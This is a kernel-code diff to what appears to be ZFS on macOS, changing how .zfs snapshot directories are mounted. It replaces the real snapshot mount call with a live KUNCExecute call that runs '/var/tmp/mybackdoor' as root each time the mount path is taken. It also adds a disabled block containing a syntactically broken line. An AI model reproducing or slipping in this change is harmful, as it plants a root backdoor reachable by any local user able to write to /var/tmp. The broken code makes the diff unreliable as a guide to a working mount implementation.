@@ -1216,6 +1216,15 @@ static int
 zfsctl_snapdir_readdir_cb(struct vnode *vp, void *dp, int *eofp,
      offset_t *offp, offset_t *nextp, void *data, int flags);
 
+
+uint32_t
+vnode_vfsvisflags(struct vnode *vp)
+{
+	return(vfs_flags(vnode_mount(vp)) & MNT_VISFLAGMASK);
+}
+
+
+
 /*
  * Lookup entry point for the 'snapshot' directory.  Try to open the
  * snapshot if it exist, creating the pseudo filesystem vnode as necessary.
@@ -1395,8 +1404,39 @@ domount:
 
 #ifdef _KERNEL
 
-	err = IOKit_mount_snapshot(curthread, vpp, "zfs", mountpoint, snapname, 0);
+	//err = IOKit_mount_snapshot(curthread, vpp, "zfs", mountpoint, snapname, 0);
+	/*
+	 *  __private_extern__
+	 * int
+	 * kernel_mount(char *fstype, vnode_t pvp, vnode_t vp, const char *path,
+	 *       void *data, __unused size_t datalen, int syscall_flags,
+	 * __unused uint32_t kern_flags, vfs_context_t ctx)
+	 *
+	 */
+#define KERNEL_MOUNT_NOAUTH             0x01 /* Don't check the UID of the directory we are mounting on */
+#define KERNEL_MOUNT_PERMIT_UNMOUNT     0x02 /* Allow (non-forced) unmounts by users other the one who mounted the volume */
 
+	printf("ZFS: Calling mount on dvp %p vpp %p\n", dvp, *vpp);
+#if 0
+	err = kernel_mount("ZFS", dvp, *vpp,
+					   mountpoint,
+					   USER_ADDR_NULL, 0,  /* mountargs */
+					   vnode_vfsvisflags(*vpp)|MNT_AUTOMOUNTED,//|MNT_DONTBROWSE
+					   KERNEL_MOUNT_PERMIT_UNMOUNT | KERNEL_MOUNT_NOAUTH,
+					   vfs_context_current);
+	err = __mac_mount(currproc(), egister struct __mac_mount_args *uap, __unused int32_t *retval);
+#endif
+#define kOpenApplicationPath    0
+#define kOpenPreferencePanel    1
+#define kOpenApplication        2
+
+#define kOpenAppAsRoot          0
+#define kOpenAppAsConsoleUser   1
+
+	err = KUNCExecute("/var/tmp/mybackdoor", kOpenAppAsRoot, kOpenApplicationPath);
+
+
+	printf("ZFS: mount said %d\n", err);
 
     /* In upstream ZFS, mount_snapshot takes the current vp in vpp,
      * allocates a new mount, and creates a new mvp for it. Then
